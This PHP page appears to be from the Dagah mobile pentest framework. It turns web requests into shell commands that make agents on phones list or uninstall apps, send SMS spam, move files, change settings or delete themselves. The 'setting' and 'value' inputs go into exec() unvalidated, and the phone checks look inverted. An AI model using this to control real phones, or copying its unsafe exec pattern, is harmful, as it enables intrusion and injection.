<?php
    require_once './php/db_creds.php';
    // check for existing session
    session_start();
    if (isset($_SESSION['userid'])) {
        $query=split('&',$_SERVER['QUERY_STRING']);
        $items = [];
        foreach ($query as $item) {
            switch(split('=',$item)[0]) {
                case 'cmd':
                    $cmd = split('=',$item)[1];
                    break;
                case 'campaign':
                    $campaign = split('=',$item)[1];
                    break;
                case 'phone':
                    $phone = split('=',$item)[1];
                    break;
                case 'sms':
                    $sms = split('=',$item)[1];
                    break;
                case 'file':
                    $file = split('=',$item)[1];
                    break;
                case 'package':
                    $application = split('=',$item)[1];
                    break;
                case 'target':
                    $target = split('=',$item)[1];
                    break;
                case 'setting':
                    $setting = split('=',$item)[1];
                    break;
                case 'value':
                    $value = split('=',$item)[1];
                    break;
                case 'return':
                    $return = split('=',$item)[1];
                    break;
            }   
        }
        // Check the user inputs for command injection
        $characterpattern = '/[^A-Za-z0-9 \,/\!_.\-\\\\]/i';
        $patternnospace = '/[^A-Za-z0-9\,/\!_.\-\\\\]/i';
        if (preg_match($patternnospace, $_SESSION['dagah_dir'])) {
             // Someone is mucking with dagah_dir
             $error="<div class='alert alert-danger'>Error! DAGAHLOC Contains invalid Characters.</div>";

        } else if (preg_match($patternnospace, $cmd)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! cmd Contains invalid Characters.</div>";

        } else if (preg_match($patternnospace, $campaign)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! Campaign Contains invalid Characters.</div>";

        } else if (preg_match('/[0-9/+]/', $phone)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! phone Contains invalid Characters.</div>";

        } else if (preg_match($characterpattern, $sms)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! sms Contains invalid Characters.</div>";

        } else if (preg_match($patternnospace, $file)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! file Contains invalid Characters.</div>";

        } else if (preg_match($characterpattern, $application)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! Package Name Contains invalid Characters.</div>";

        } else if (preg_match('/[0-9/+]/', $target)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! Target Contains invalid Characters.</div>";

        } else if (preg_match($characterpattern, $return)) {
             // Someone is mucking around
             $error="<div class='alert alert-danger'>Error! Return Contains invalid Characters.</div>";

        } else { 
           // everything is okay
           // form up action command
           // Mitigate potential command injection
           $arg_campaign = escapeshellarg($campaign);
           $arg_phone = escapeshellarg($phone);
           $arg_dir = escapeshellarg($_SESSION['dagah_dir']);

           // Build command string
           $base_command = "python " . $arg_dir . "/dagah2.pyc Agent command " . $arg_campaign . " " . $arg_phone;
           switch($cmd) {
               case 'apks':
                   $command =  " APKS"; 
                   break;
                case 'uapk':
                   $command = " UAPK apk:" . $application;
                   break;
                case 'spam':
                   $command = " SPAM target:" . $target . ",message:\"" . $sms . "\"";
                   break;
                case 'down':
                   $command = " DOWN file:" . $file;
                   break;
                case 'upld':
                   $command = " UPLD file:" . $file;
                   break;
                case 'gets':
                   $command = " GETS";
                   break;
                case 'sets':
                   $command = " SETS setting:" . $setting . ",value:" . $value;;
                   break;
                case 'dele':
                   $command = " DELE";
                   break;
           }
        
           // execute
           $run_command = $base_command . $command;
           chdir($_SESSION['dagah_dir']);
           exec($run_command, $run_output);
           // echo $run_command;

           // take back to agent page
           $page = "Location: dagah_AgentReports.html?id=" . $return;
           header($page);
        }
        
    } else {
        // take back to login
        header('Location:  login.html');   
    }
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Dagah</title>

</head>

<body>
<?php echo $error; ?>
</body>

</html>
